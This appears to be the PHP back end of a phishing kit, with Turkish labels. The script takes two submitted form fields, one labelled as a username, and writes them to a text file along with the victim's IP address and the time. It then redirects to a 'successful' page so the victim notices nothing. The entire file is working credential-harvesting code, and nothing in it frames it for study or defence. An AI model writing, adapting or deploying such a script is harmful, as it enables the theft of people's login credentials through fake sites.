<?php
$kod1 = $_POST['lol'];
$kod2 =  $_POST['lol2'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('dogrulama.txt', 'a'); 
fwrite($file, $kod1."-----Kullanici adi-----> " .$kod2. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file); 
echo '';
			header("Refresh:0; url=basarili.html");
?>





